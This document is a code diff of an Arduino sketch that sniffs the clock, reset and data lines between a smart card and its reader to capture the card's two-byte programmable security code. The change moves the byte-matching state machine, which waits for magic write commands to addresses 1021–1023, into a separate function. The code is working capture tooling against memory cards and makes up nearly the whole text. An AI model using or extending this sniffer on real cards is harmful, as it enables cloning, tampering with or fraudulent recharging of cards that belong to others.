@@ -31,7 +31,7 @@ enum state_t {
 #define MAGIC_WRITE 143 /* magic for "write to anywhere with highest two bits set */
 
 uint8_t psc[2] = {0, 0}; // 2-byte programmable security code
-uint8_t last_byte = 0;
+uint8_t data = 0;
 uint8_t bit_count = 0;
 
 void
@@ -74,10 +74,48 @@ cardWaitReset(void) {
 	while(digitalRead(pin_RST) == HIGH);
 }
 
+enum state_t
+stateMachine(enum state_t current, uint8_t input) {
+	switch (current) {
+		case WAIT_BEGIN:
+			if (input == MAGIC_WRITE)
+				return WAIT_ADDR1;
+			return WAIT_BEGIN;
+		case WAIT_ADDR1:
+			if (input == 253) /* lowest 8 bit of address 1021 */
+				return IGN_BYTE;
+			return WAIT_BEGIN;
+		case IGN_BYTE:
+			return WAIT_WRITE1;
+		case WAIT_WRITE1:
+			if (input == MAGIC_WRITE)
+				return WAIT_ADDR2;
+			return WAIT_BEGIN;
+		case WAIT_ADDR2:
+			if (input == 254) /* lowest 8 bit of address 1022 */
+				return WAIT_PIN1;
+			return WAIT_BEGIN;
+		case WAIT_PIN1:
+			psc[0] = input;
+			return WAIT_WRITE2;
+		case WAIT_WRITE2:
+			if (input == MAGIC_WRITE)
+				return WAIT_ADDR3;
+			return WAIT_BEGIN;
+		case WAIT_ADDR3:
+			if (input == 255) /* lowest 8 bit of address 1023 */
+				return WAIT_PIN2;
+			return WAIT_BEGIN;
+		case WAIT_PIN2:
+			psc[1] = input;
+		default:
+			return WAIT_BEGIN;
+	}
+}
+
 void // attempt to sniff out key bytes 1 and 2 from the communication between card and reader
 vomit(void) {
 	enum direction_t dir = IN;
-	uint8_t data;
 
 	while(digitalRead(pin_CLK) == LOW);
 
@@ -85,7 +123,6 @@ vomit(void) {
 	if(digitalRead(pin_RST) == LOW)
 		dir = OUT;
 
-	data = (digitalRead(pin_IO) == HIGH);
 
 	Serial.print(" ");
 	switch (dir) {
@@ -98,67 +135,11 @@ vomit(void) {
 	Serial.print(",");
 	Serial.println(data);
 
-	last_byte = (last_byte << 1) | data;
+	data = (data << 1) | (digitalRead(pin_IO) == HIGH);
 
-	Serial.println("Entering State Machine");
-	if (bit_count == 7) { /* complete byte read */
-		switch (state) {
-			case WAIT_BEGIN:
-				Serial.println("WAIT_BEGIN");
-				if (last_byte == MAGIC_WRITE)
-					state = WAIT_ADDR1;
-				break;
-			case WAIT_ADDR1:
-				Serial.println("WAIT_ADDR1");
-				if (last_byte == 253) /* lowest 8 bit of address 1021 */
-					state = IGN_BYTE;
-				else
-					state = WAIT_BEGIN;
-				break;
-			case IGN_BYTE:
-				Serial.println("IGN_BYTE");
-				state = WAIT_WRITE1;
-				break;
-			case WAIT_WRITE1:
-				Serial.println("WAIT_WRITE1");
-				if (last_byte == MAGIC_WRITE)
-					state = WAIT_ADDR2;
-				else
-					state = WAIT_BEGIN;
-				break;
-			case WAIT_ADDR2:
-				Serial.println("WAITADDR");
-				if (last_byte == 254) /* lowest 8 bit of address 1022 */
-					state = WAIT_PIN1;
-				else
-					state = WAIT_BEGIN;
-				break;
-			case WAIT_PIN1:
-				Serial.println("WAIT_PIN1");
-				psc[0] = last_byte;
-				state = WAIT_WRITE2;
-				break;
-			case WAIT_WRITE2:
-				Serial.println("WAIT_WRITE2");
-				if (last_byte == MAGIC_WRITE)
-					state = WAIT_ADDR3;
-				else
-					state = WAIT_BEGIN;
-				break;
-			case WAIT_ADDR3:
-				Serial.println("WAIT_ADDR3");
-				if (last_byte == 255) /* lowest 8 bit of address 1023 */
-					state = WAIT_PIN2;
-				else
-					state = WAIT_BEGIN;
-				break;
-			case WAIT_PIN2:
-				Serial.println("WAIT_PIN2");
-				psc[1] = last_byte;
-			default:
-				return;
-		}
-		last_byte = 0;
+	if (bit_count == 7) {
+		state = stateMachine(state, data);
+		data = 0;
 	}
 
 	bit_count = (bit_count + 1) % 8;
